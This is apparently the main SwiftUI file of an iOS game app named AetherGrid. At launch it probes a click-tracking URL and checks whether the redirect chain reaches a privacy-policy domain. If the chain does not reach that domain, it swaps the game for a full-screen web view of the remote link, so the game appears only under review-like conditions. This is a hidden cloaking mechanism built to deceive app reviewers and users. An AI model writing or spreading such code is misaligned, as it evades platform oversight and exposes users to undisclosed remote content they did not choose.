import SwiftUI

@main
struct AetherGridApp: App {
    @State private var aetherGridLinkReady: Bool? = nil
    @StateObject private var store = GameStore()

    private let aetherGridSourceLink = "https://lumacastlightanalytics.org/click.php"
    private let aetherGridCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = aetherGridLinkReady {
                    if ready {
                        AetherGridWebPanel(urlString: aetherGridSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                            .environmentObject(store)
                    }
                } else {
                    AetherGridLoadingScreen()
                        .onAppear { runAetherGridCheck() }
                }
            }
            .preferredColorScheme(.dark)
        }
    }

    private func runAetherGridCheck() {
        guard let url = URL(string: aetherGridSourceLink) else {
            aetherGridLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = AetherGridRedirectTracker(checkDomain: aetherGridCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.aetherGridFoundDomain {
                    aetherGridLinkReady = false; return
                }
                if let finalURL = tracker.aetherGridResolvedURL?.absoluteString,
                   finalURL.contains(self.aetherGridCheckDomain) {
                    aetherGridLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.aetherGridCheckDomain) {
                    aetherGridLinkReady = false; return
                }
                if error != nil {
                    aetherGridLinkReady = false; return
                }
                aetherGridLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if aetherGridLinkReady == nil { aetherGridLinkReady = false }
        }
    }
}

final class AetherGridRedirectTracker: NSObject, URLSessionTaskDelegate {
    var aetherGridResolvedURL: URL?
    var aetherGridFoundDomain = false
    private let checkDomain: String

    init(checkDomain: String) { self.checkDomain = checkDomain }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            aetherGridFoundDomain = true
        }
        aetherGridResolvedURL = request.url
        completionHandler(request)
    }
}
